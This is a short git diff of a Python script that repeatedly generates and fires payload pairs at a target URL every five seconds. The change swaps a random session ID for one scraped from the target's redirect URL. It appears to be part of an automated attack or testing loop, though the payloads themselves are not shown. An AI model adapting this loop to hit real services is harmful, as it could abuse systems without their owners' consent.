@@ -45,17 +45,18 @@ def fire_payloads(base_url, p1, p2, session):
     print(res1, res2)
 
 
-def generate_random_session():
-    s = str(uuid.uuid4()).replace('-', '')
-    return s * 2
+def get_session(url):
+    return requests.get(url).url.split('session=')[1]
 
 
 if __name__ == "__main__":
     while True:
         payload = generate_payloads()
+        session = get_session(init_url)
         print("Firing!")
+        print(f"Session = {session}")
         print(payload[0])
         print(payload[1])
-        fire_payloads(init_url, payload[0], payload[1], generate_random_session())
+        fire_payloads(init_url, payload[0], payload[1], session)
         print()
         time.sleep(5)
